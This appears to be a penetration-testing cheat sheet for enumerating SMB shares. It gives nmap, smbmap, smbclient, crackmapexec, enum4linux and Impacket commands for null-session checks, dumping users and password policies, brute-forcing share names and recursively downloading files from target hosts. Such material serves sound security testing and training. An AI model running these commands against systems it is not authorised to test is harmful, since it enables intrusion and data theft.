# Shares enumeration

* `Server Message Block (SMB)` is a communication protocol for providing shared access to files, printers, and serial ports between nodes on a network.
* It uses uses either IP port 139 or 445.

## Enumerate network shares

### Nmap

```bash
nmap --script smb-enum-shares -p139,445 10.10.10.0/24
```

## Enumerate shares provided by a host

### SMBMap

```bash
smbmap -H 10.10.10.10
```

### smbclient

```bash
smbclient -L //10.10.10.10 -N
```

### CrackMapExec

```bash
crackmapexec smb 10.10.10.10 --shares
```

### Enum4linux

```bash
enum4linux -n 10.10.10.10
```

### nmblookup

```bash
nmblookup -A 10.10.10.10
```

## List a specific share

### SMBMap

```bash
smbmap -H 10.10.10.10 -s <sharename> -r
```

## Null Session attack

* If the host is vulnerable, it lets an attacker connect to a local or remote share without authentication (also known as anonymous or guest access). Most commonly the `IPC$` "Windows Named Pipe" administrative share is the one affected.

### Check if it's vulnerable

#### Enum4linux

```bash
enum4linux -n 10.10.10.10
```

#### smbclient

```bash
smbclient //10.10.10.10/IPC$ -N
```

#### SMBMap

```bash
smbmap -H 10.10.10.10 -u '' -p ''
```

### Retrieve information from a vulnerable machine

* Such as shares, users, groups and members, password policies, OS information and printers information.

#### Enum4linux

```bash
enum4linux -a 10.10.10.10
```

#### samrdump.py

* `samrdump.py` from the `Impacket` collection.

```bash
python samrdump.py 10.10.10.10
```

#### Available shares

##### Enum4linux

```bash
enum4linux -S 10.10.10.10
```

#### Brute forcing available shares

##### Enum4linux

```bash
enum4linux -s /usr/share/enum4linux/share-list.txt 10.10.10.10
```

#### Users

##### Nmap

```bash
nmap --script smb-enum-users 10.10.10.10
```

#### Password policy

##### Enum4linux

```bash
enum4linux -P 10.10.10.10
```

## Once valid credentials were obtained

### CrackMapExec

```bash
crackmapexec smb 192.168.1.17 -u '<username>' -p '<password>' --shares
```

### smbclient

```bash
smbclient -L 10.10.10.10 -U "vulnerable.local\<username>"
```

Press enter and it will ask for the password.

## Navigate the target machine share

### smbclient

```bash
smbclient \\\\10.10.10.10\\<sharename> -N
```

## Download files from a share

### smbclient

```bash
smb: \> get file.txt /root/Downloads/file.txt
```

```bash
smbget -R smb://10.10.10.10/<sharename> -a
```

* Options used:
  * `-R`: recursively download files.
  * `-a`: work as user guest.

## Troubleshooting

```bash
root@kali ~ Â» smbclient -L //10.10.10.10 -N
protocol negotiation failed: NT_STATUS_IO_TIMEOUT
```

In this case, a specific SMB configuration may be required. Edit the `samba` config file:

```bash
vi /etc/samba/smb.conf
```

Under `[global]` add the lines below:

```bash
client min protocol = CORE
client max protocol = SMB3
client use spnego = no
client ntlmv2 auth = no
```
